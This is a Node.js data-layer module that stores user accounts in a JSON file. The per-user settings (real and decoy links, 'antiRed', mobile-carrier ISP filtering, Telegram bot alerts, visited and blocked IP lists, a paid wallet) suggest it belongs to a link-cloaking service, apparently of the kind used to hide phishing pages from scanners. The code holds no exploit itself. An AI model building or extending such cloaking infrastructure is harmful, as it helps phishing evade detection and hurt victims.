const fs = require('fs').promises;
const fssync = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

// Support Render Persistent Disk at /data
const PERSISTENT_DATA_DIR = '/data';
const LOCAL_DATA_DIR = path.join(__dirname, 'data');
const DATA_DIR = fssync.existsSync(PERSISTENT_DATA_DIR) ? PERSISTENT_DATA_DIR : LOCAL_DATA_DIR;

const USERS_FILE = path.join(DATA_DIR, 'users.json');

console.log(`[DB] Using data directory: ${DATA_DIR}`);
console.log(`[DB] Users file: ${USERS_FILE}`);

if (!fssync.existsSync(DATA_DIR)) {
    try {
        fssync.mkdirSync(DATA_DIR, { recursive: true });
    } catch (err) {
        console.error(`Error creating data directory ${DATA_DIR}:`, err);
    }
}

if (!fssync.existsSync(USERS_FILE)) {
    fssync.writeFileSync(USERS_FILE, JSON.stringify([]));
}

async function getUsers() {
    const data = await fs.readFile(USERS_FILE, 'utf8');
    return JSON.parse(data);
}

async function saveUsers(users) {
    await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
}

async function createUser(userData) {
    const users = await getUsers();
    const newUser = {
        id: uuidv4(),
        slug: crypto.randomBytes(4).toString('hex'),
        name: userData.name,
        email: userData.email,
        telegram: userData.telegram,
        password: userData.password, // hashed
        pinHash: userData.pinHash || null, // 4-digit security PIN (bcrypt hash); null until set
        wallet: 0.0,
        isActive: true,
        expiryDate: null, // ISO string for link expiration
        links: [], // Multiple landing pages
        settings: {
            nonRealLink: '',
            realLink: '',
            antiRed: true,
            ispFilter: true,
            reallowVisited: true,
            botToken: '',
            chatId: '',
            mobileIsps: ['ATT', 'VERIZON', 'T-MOBILE', 'SPRINT', 'CRICKET', 'METROPCS']
        },
        forcedIps: [],
        blockedIps: [],
        visitedIps: [],
        pendingPayments: [],
        createdAt: new Date().toISOString()
    };
    users.push(newUser);
    await saveUsers(users);
    return newUser;
}

async function findUserByEmail(email) {
    const users = await getUsers();
    return users.find(u => u.email === email);
}

async function findUserById(id) {
    const users = await getUsers();
    return users.find(u => u.id === id);
}

async function findUserBySlug(slug) {
    if (!slug) return null;
    const users = await getUsers();
    // Only custom uplinks in user.links[] are resolvable now.
    for (const user of users) {
        const link = (user.links || []).find(l => l.slug === slug);
        if (link) return { user, link };
    }
    return null;
}

async function updateUser(id, updates) {
    const users = await getUsers();
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
        users[index] = { ...users[index], ...updates };
        await saveUsers(users);
        return users[index];
    }
    return null;
}

module.exports = {
    createUser,
    getUsers,
    findUserByEmail,
    findUserById,
    findUserBySlug,
    updateUser
};
